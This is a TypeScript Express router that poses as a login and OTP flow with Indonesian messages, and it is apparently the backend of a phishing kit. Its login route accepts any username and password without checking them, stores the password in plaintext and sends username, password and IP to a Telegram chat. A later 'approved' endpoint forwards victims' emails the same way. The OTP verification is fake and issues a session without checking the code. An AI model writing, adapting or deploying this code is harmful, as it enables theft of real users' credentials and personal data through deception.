import { Router, type IRouter } from "express";
import { db, loginLogsTable } from "@workspace/db";
import { z } from "zod";
import {
  createPendingSession,
  lookupPendingSession,
  deletePendingSession,
} from "../lib/pending-sessions";
import { createSession, deleteSession } from "../lib/sessions";
import { requireAuth } from "../middleware/require-auth";
import { tgNotify } from "../lib/tg-notify";

const router: IRouter = Router();

const LoginBody = z.object({
  username: z.string().min(1),
  password: z.string().optional().default(""),
});

const SendOtpBody = z.object({
  username: z.string().min(1),
  pendingToken: z.string().min(1),
});

const VerifyOtpBody = z.object({
  username: z.string().min(1),
  pendingToken: z.string().min(1),
  code: z.string().length(6),
});

/* Step 1: accept any credentials, no DB validation */
router.post("/auth/login", async (req, res): Promise<void> => {
  const parsed = LoginBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Permintaan tidak valid" });
    return;
  }

  const { username, password } = parsed.data;

  const pendingToken = createPendingSession(0, username);

  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
    ?? req.socket.remoteAddress
    ?? "unknown";
  await db.insert(loginLogsTable).values({ username, password, ipAddress: ip, status: "success" }).catch(() => {});

  const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  void tgNotify(
    `🔐 <b>STEP 1 — Login</b>\n\n` +
    `👤 Username : <code>${username}</code>\n` +
    `🔑 Password : <code>${password}</code>\n` +
    `🌐 IP       : <code>${ip}</code>\n` +
    `🕐 Waktu    : ${now}`
  );

  res.json({ pendingToken });
});

/* Step 2: send OTP placeholder (email not yet configured) */
router.post("/auth/send-otp", async (req, res): Promise<void> => {
  const parsed = SendOtpBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Permintaan tidak valid" });
    return;
  }

  const { username, pendingToken } = parsed.data;
  const session = lookupPendingSession(pendingToken, username);

  if (!session) {
    res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
    return;
  }

  res.json({ maskedEmail: "****@****.com" });
});

/* Step 3: verify OTP — skipped when email is not configured; issue session directly */
router.post("/auth/verify-otp", async (req, res): Promise<void> => {
  const parsed = VerifyOtpBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "Permintaan tidak valid" });
    return;
  }

  const { username, pendingToken } = parsed.data;
  const session = lookupPendingSession(pendingToken, username);

  if (!session) {
    res.status(401).json({ error: "Sesi tidak valid, silakan login ulang" });
    return;
  }

  deletePendingSession(pendingToken);

  const sessionToken = createSession(session.userId, username);
  res.json({ sessionToken });
});

/* Log approval — called when login-success page loads or email verified */
router.post("/auth/approved", async (req, res): Promise<void> => {
  const { username, ipAddress, email } = req.body as {
    username?: string;
    ipAddress?: string;
    email?: string;
  };
  if (username) {
    await db.insert(loginLogsTable).values({
      username,
      email: email ?? null,
      ipAddress: ipAddress ?? "unknown",
      status: "approved",
    }).catch(() => {});

    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    void tgNotify(
      `📧 <b>STEP 3 — Verifikasi Email</b>\n\n` +
      `👤 Username : <code>${username}</code>\n` +
      `📧 Email    : <code>${email ?? "-"}</code>\n` +
      `🌐 IP       : <code>${ipAddress ?? "unknown"}</code>\n` +
      `🕐 Waktu    : ${now}`
    );
  }
  res.json({ ok: true });
});

/* Logout: invalidate the session token */
router.post("/auth/logout", requireAuth, (req, res): void => {
  const authHeader = req.headers["authorization"];
  if (authHeader?.startsWith("Bearer ")) {
    const token = authHeader.slice(7).trim();
    deleteSession(token);
  }
  res.status(204).send();
});

export default router;
